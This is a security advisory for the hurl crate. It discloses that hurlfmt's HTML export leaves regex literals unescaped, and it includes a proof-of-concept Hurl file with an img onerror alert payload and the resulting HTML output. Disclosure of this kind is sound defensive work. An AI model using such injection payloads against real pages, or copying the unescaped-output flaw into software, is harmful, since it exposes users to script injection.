# [M] Regex literal in Hurl files are not escaped when exported to HTML, allowing injections

## Summary
Severity: Medium
Advisory: GHSA-v33j-v3x4-42qg
Ecosystem: crates.io
Published: 2025-06-11
Source: https://github.com/advisories/GHSA-v33j-v3x4-42qg
Type: github-advisory

## Affected
- crates.io: `hurl` — affected >=0 <7.0.0

## Details
Given this Hurl file:

regex.hurl:

```
GET https://foo.com
HTTP 200
[Asserts]
jsonpath "$.body" matches /<img src="" onerror="alert('Hi!')">/
```

When exported to HTML:

```
$ hurlfmt --out html regex.hurl
<pre><code class="language-hurl"><span class="hurl-entry"><span class="request"><span class="line"><span class="method">GET</span> <span class="url">https://foo.com</span></span>
</span><span class="response"><span class="line"><span class="version">HTTP</span> <span class="number">200</span></span>
<span class="line"><span class="section-header">[Asserts]</span></span>
<span class="line"><span class="query-type">jsonpath</span> <span class="string">"$.body"</span> <span class="predicate-type">matches</span> <span class="regex">/<img src="" onerror="alert('Hi!')">/</span></span>
</span></span><span class="line"></span>
</code></pre>
```

The regex literal `/<img src="" onerror="alert('Hi!')">/` is not escaped:

`<span class="regex">/<img src="" onerror="alert('Hi!')">/</span></span>`

When opened in a browser, the code is run without user interaction:

![regex](https://github.com/user-attachments/assets/9c20a2ff-900f-4420-b38b-1e7648749119)

## References
- https://github.com/Orange-OpenSource/hurl/security/advisories/GHSA-v33j-v3x4-42qg
- https://github.com/Orange-OpenSource/hurl/commit/248ac41cfa1797c52241c6ef756490d90027cdf2
- https://github.com/Orange-OpenSource/hurl/commit/7dcdbd1796785392b1e829d1f07c6687b9a8f27d
- https://github.com/Orange-OpenSource/hurl
